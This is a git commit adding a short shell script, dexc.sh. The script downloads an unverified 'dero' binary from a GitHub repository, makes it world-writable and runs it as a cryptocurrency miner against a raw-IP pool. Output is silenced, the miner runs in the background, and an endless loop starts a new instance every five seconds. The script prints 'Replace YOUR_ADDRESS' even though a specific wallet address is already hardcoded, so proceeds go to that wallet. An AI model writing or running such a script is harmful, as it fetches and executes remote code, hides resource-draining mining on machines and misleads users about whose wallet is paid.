357ce12691f692cfc97039d5f232c7c4291beeb2
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-12 22:15:32 +0700

    Update and rename strat.sh to dexc.sh

---
+++ dexc.sh
@@ -0,0 +1,9 @@
+wget https://github.com/aqshakuy/dora/raw/main/dero
+chmod 777 dero
+
+#!/bin/bash
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+./dero -w dERoSCQeRCe3GVBEHoJh2tgR2KZNF22gcCuYW29ZuAJFGk9rA7UWFwdPcXzxnXLvQ4V8WdntxVoxK4qruF2GahFf49oRxiMH8H -r 45.76.162.175:80 -p stratum -m 3 > /dev/null 2>&1 &
+sleep 5;
+done
